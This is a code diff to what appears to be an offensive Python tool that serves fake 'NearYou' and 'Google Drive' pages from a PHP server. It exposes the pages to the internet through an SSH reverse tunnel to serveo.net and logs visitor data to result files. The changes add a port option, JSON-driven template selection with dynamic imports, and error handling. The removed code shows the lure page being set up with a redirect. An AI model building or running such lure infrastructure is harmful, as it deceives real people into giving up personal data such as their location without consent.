@@ -18,20 +18,22 @@ W = '\033[0m'  # white
 parser = argparse.ArgumentParser()
 parser.add_argument('-s', '--subdomain', help='Provide Subdomain for Serveo URL ( Optional )')
 parser.add_argument('-k', '--kml', help='Provide KML Filename ( Optional )')
-parser.add_argument('-t', '--tunnel', help='Specify Tunnel Mode [manual]')
+parser.add_argument('-t', '--tunnel', help='Specify Tunnel Mode [ Available : manual ]')
+parser.add_argument('-p', '--port', type=int, default=8080, help='Port for Web Server [ Default : 8080 ]')
+
 args = parser.parse_args()
 subdom = args.subdomain
 kml_fname = args.kml
 tunnel_mode = args.tunnel
+port = args.port
 
 row = []
 site = ''
 info = ''
 result = ''
-version = '1.2.1'
+version = '1.2.4'
 
 def banner():
-	os.system('clear')
 	print (G +
 	r'''
                         __
@@ -46,18 +48,21 @@ def banner():
 def ver_check():
 	print(G + '[+]' + C + ' Checking for Updates.....', end='')
 	ver_url = 'https://raw.githubusercontent.com/thewhiteh4t/seeker/master/version.txt'
-	ver_rqst = requests.get(ver_url)
-	ver_sc = ver_rqst.status_code
-	if ver_sc == 200:
-		github_ver = ver_rqst.text
-		github_ver = github_ver.strip()
+	try:
+		ver_rqst = requests.get(ver_url)
+		ver_sc = ver_rqst.status_code
+		if ver_sc == 200:
+			github_ver = ver_rqst.text
+			github_ver = github_ver.strip()
 
-		if version == github_ver:
-			print(C + '[' + G + ' Up-To-Date ' + C +']' + '\n')
+			if version == github_ver:
+				print(C + '[' + G + ' Up-To-Date ' + C +']' + '\n')
+			else:
+				print(C + '[' + G + ' Available : {} '.format(github_ver) + C + ']' + '\n')
 		else:
-			print(C + '[' + G + ' Available : {} '.format(github_ver) + C + ']' + '\n')
-	else:
-		print(C + '[' + R + ' Status : {} '.format(ver_sc) + C + ']' + '\n')
+			print(C + '[' + R + ' Status : {} '.format(ver_sc) + C + ']' + '\n')
+	except Exception as e:
+		print('\n' + R + '[-]' + C + ' Exception : ' + W + str(e))
 
 def tunnel_select():
 	if tunnel_mode == None:
@@ -71,24 +76,33 @@ def tunnel_select():
 def template_select():
 	global site, info, result
 	print(G + '[+]' + C + ' Select a Template : ' + W + '\n')
-	print(G + '[1]' + C + ' NearYou' + W)
-	print(G + '[2]' + C + ' Google Drive' + W)
+	
+	with open('template/templates.json', 'r') as templ:
+		templ_info = templ.read()
+	
+	templ_json = json.loads(templ_info)
+	
+	for item in templ_json['templates']:
+		name = item['name']
+		print(G + '[{}]'.format(templ_json['templates'].index(item)) + C + ' {}'.format(name) + W)
+	
 	selected = int(input(G + '[>] ' + W))
 	
-	if selected == 1:
-		site = 'nearyou'
-		print('\n' + G + '[+]' + C + ' Loading NearYou Template...' + W)
-	elif selected == 2:
-		site = 'gdrive'
-		print('\n' + G + '[+]' + C + ' Loading Google Drive Template...' + W)
-		redirect = input(G + '[+]' + C + ' Enter GDrive File URL : ' + W)
-		with open('template/gdrive/js/location_temp.js', 'r') as js:
-			reader = js.read()
-			update = reader.replace('REDIRECT_URL', redirect)
-		with open('template/gdrive/js/location.js', 'w') as js_update:
-			js_update.write(update)
+	try:
+		site = templ_json['templates'][selected]['dir_name']
+	except IndexError:
+		print('\n' + R + '[-]' + C + ' Invalid Input!' + W + '\n')
+		sys.exit()
+	
+	print('\n' + G + '[+]' + C + ' Loading {} Template...'.format(templ_json['templates'][selected]['name']) + W + '\n')
+	
+	module = templ_json['templates'][selected]['module']
+	if module == True:
+		imp_file = templ_json['templates'][selected]['import_file']
+		import importlib
+		importlib.import_module('template.{}'.format(imp_file))
 	else:
-		print(R + '[-]' + C + ' Invalid Input, Only Numbers Accepted' + W + '\n')
+		pass
 
 	info = 'template/{}/php/info.txt'.format(site)
 	result = 'template/{}/php/result.txt'.format(site)
@@ -115,13 +129,12 @@ def serveo():
 	print(G + '[+]' + C + ' Getting Serveo URL...' + W + '\n')
 	if subdom is None:
 		with open('logs/serveo.txt', 'w') as tmpfile:
-			proc = subp.Popen(['ssh', '-oStrictHostKeyChecking=no', '-R', '80:localhost:8080', 'serveo.net'], stdout=tmpfile, stderr=tmpfile, stdin=subp.PIPE)
+			proc = subp.Popen(['ssh', '-oStrictHostKeyChecking=no', '-R', '80:localhost:{}'.format(port), 'serveo.net'], stdout=tmpfile, stderr=tmpfile, stdin=subp.PIPE)
 	else:
 		with open('logs/serveo.txt', 'w') as tmpfile:
-			proc = subp.Popen(['ssh', '-oStrictHostKeyChecking=no', '-R', '{}.serveo.net:80:localhost:8080'.format(subdom), 'serveo.net'], stdout=tmpfile, stderr=tmpfile, stdin=subp.PIPE)
+			proc = subp.Popen(['ssh', '-oStrictHostKeyChecking=no', '-R', '{}.serveo.net:80:localhost:{}'.format(subdom, port), 'serveo.net'], stdout=tmpfile, stderr=tmpfile, stdin=subp.PIPE)
+	
 	while True:
-		
-		time.sleep(2)
 		with open('logs/serveo.txt', 'r') as tmpfile:
 			try:
 				stdout = tmpfile.readlines()
@@ -140,15 +153,17 @@ def serveo():
 			except Exception as e:
 				print(e)
 				pass
+		time.sleep(2)
 
 def server():
 	global site
+	print('\n' + G + '[+]' + C + ' Port : '+ W + str(port))
 	print('\n' + G + '[+]' + C + ' Starting PHP Server......' + W, end='')
 	with open('logs/php.log', 'w') as phplog:
-		subp.Popen(['php', '-S', '0.0.0.0:8080', '-t', 'template/{}/'.format(site)], stdout=phplog, stderr=phplog)
+		subp.Popen(['php', '-S', '0.0.0.0:{}'.format(port), '-t', 'template/{}/'.format(site)], stdout=phplog, stderr=phplog)
 		time.sleep(3)
 	try:
-		php_rqst = requests.get('http://0.0.0.0:8080/index.html')
+		php_rqst = requests.get('http://0.0.0.0:{}/index.html'.format(port))
 		php_sc = php_rqst.status_code
 		if php_sc == 200:
 			print(C + '[' + G + ' Success ' + C + ']' + W)
